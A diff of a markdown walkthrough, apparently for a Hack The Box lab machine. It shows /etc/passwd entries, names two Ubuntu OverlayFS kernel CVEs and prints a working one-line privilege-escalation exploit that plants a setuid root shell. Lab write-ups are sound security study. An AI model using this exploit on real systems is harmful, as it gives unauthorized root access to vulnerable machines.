@@ -95,17 +95,20 @@ metalytics@analytics:~$
 ```
 ###### Great, well done !!!
 
-<!-- the root seems to be active  -->
+###### the root seems to be active 
+
 ```
 root:x:0:0:root:/root:/bin/bash
 metalytics:x:1000:1000:,,,:/home/metalytics:/bin/bash
 ```
 ## Privesc:
 
-<!-- the kernel version seems to be vuln "6.2.0" to these OverlayFS CVEs "CVE-2023-2640 CVE-2023-32629 "
+<!-- the kernel version seems to be vuln "6.2.0" to these OverlayFS CVEs "CVE-2023-2640 CVE-2023-32629 " -->
+```
 # here is a little hint from the creators "overlay on /var/lib/docker/overlay2/957463a5867e5" thank you htb labs team <3
 # you can check out the vuln in fully here "https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability"
--->
+```
+
 ### here is the payload
 ```
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
